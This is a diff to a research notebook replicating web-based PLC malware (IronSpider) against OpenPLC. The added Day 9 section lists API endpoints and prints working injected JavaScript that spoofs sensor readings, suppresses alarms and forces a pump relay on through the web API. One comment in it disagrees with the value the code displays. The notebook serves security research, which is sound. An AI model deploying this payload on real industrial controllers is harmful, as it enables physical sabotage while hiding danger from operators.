@@ -585,7 +585,7 @@ If a session token is stored in localStorage before reloading, the injected scri
 
 ---
 
-## Day 8 — Feb 24, 2026
+## Day 8: Feb 24, 2026
 
 **Goal:** Extend the testbed with two explicit tests the paper mentions but does not measure empirically:
 1. SW survival after full server-process replacement (the "hardware replacement" claim)
@@ -743,3 +743,92 @@ followed by clearing CacheStorage — neither of which is exposed in typical PLC
 | CacheStorage evicts after 24h | ✗ (not observed) | Spec does not mandate this; Chrome does not do it |
 | 24h limit = SW script update check interval | ✓ spec | reg.update() bypasses the throttle and checks immediately |
 | Immediate remediation = DevTools clear | ✓ | Unregister SW + clear site data removes all traces |
+
+## Day 9 - Feb 26, 2026
+
+The demonstration of WB malware's capabilities is simulated by manually injecting malicious Javascript files into OpenPLC. The manual injection is analogous to the paper's use of CVE chain and Cross Channel Scripting to inject IronSpider into WAGO firmware and a Rockwell Automation MicroLogix 1100 & 1400 PLC, respectively.
+
+### API endpoints
+
+In order to design the malware, API endpoints of OpenPLC must be examined. By inspecting `OpenPLC_v3/webserver/webserver.py`, it was possible to observe the following:
+
+- GET /monitoring
+- GET /monitor-update?mb_port=502
+- GET /point-write
+
+### WB malware injected as inline script 
+
+Based on the inspection, OpenPLC only contains inline Javascript for web rendering. Therefore, the following payload was injected directly onto the monitoring OpenPLC as an inline JS script for simulating malware injection in real PLC. Specifically, the inline malware JS code was injected into `monitoring_tail`.
+
+IronSpider can sabotage physical components using web-based APIs, where its activites can include running a physical component to its breaking point, hiding the actual sensor reading from the operator behind HMI, etc. OpenPLC payload simulates this by performing three core functionalities:
+
+- Sensor reading spoofing
+- Alarm suppression
+- Actuator manipulation
+
+```Javascript
+//monitoring_tail ...
+//...
+//...
+ // =========================================================
+        // IRONSPIDER SIMULATION — MANUAL INJECTION
+        // Research replication of NDSS 2024 "Web-Based PLC Malware"
+        // In the real attack (CVE-2022-45140 on WAGO), this payload
+        // is automatically delivered via a service worker that
+        // intercepts and modifies the HTTP response stream client-side.
+        // Here it is manually injected by editing OpenPLC's served HTML,
+        // simulating the effect of that exploit on this platform.
+        // =========================================================
+
+        // Capability 1 + 2: Sensor spoofing and alarm suppression.
+        // Wraps each /monitor-update response before it is written to the DOM.
+        function ironspiderSpoof(html) {
+            var temp = document.createElement('div');
+            temp.innerHTML = html;
+            var rows = temp.querySelectorAll('tr');
+
+            rows.forEach(function(row) {
+                var cells = row.querySelectorAll('td');
+                if (cells.length < 5) return;
+                var varName = cells[0].textContent.trim();
+
+                // Capability 1: Sensor spoofing.
+                // Read the real water level, record it, display 50 instead.
+                if (varName === 'water_level') {
+                    var pTag = cells[4].querySelector('p');
+                    if (pTag) {
+                        var realValue = parseInt(pTag.textContent.trim());
+                        localStorage.setItem('is_real_water_level', realValue);
+                        localStorage.setItem('is_spoof_timestamp', Date.now());
+                        pTag.textContent = '20';
+                        var bar = cells[4].querySelector('.w3-blue');
+                        if (bar) bar.style.width = '50%';
+                    }
+                }
+
+                // Capability 2: Alarm suppression.
+                // When alarm_active is TRUE, replace with FALSE before display.
+                if (varName === 'alarm_active') {
+                    var cell = cells[4];
+                    if (cell.innerHTML.indexOf('bool_true') !== -1) {
+                        cell.innerHTML = cell.innerHTML
+                            .replace(/bool_true\.png/g, 'bool_false.png')
+                            .replace(/alt="bool_true"/g, 'alt="bool_false"')
+                            .replace(/>TRUE</g, '>FALSE<');
+                    }
+                }
+            });
+
+            return temp.innerHTML;
+        }
+
+        // Capability 3: Actuator manipulation.
+        // Force pump relay (%QX0.0) ON every 500ms regardless of ladder logic.
+        // Bypasses the PLC control loop via the web API layer.
+        var _is_manip_start = Date.now();
+        setInterval(function() {
+            fetch('/point-write?value=1&address=%QX0.0').then(function() {
+                localStorage.setItem('is_manip_elapsed_ms', Date.now() - _is_manip_start);
+            });
+        }, 500);
+```
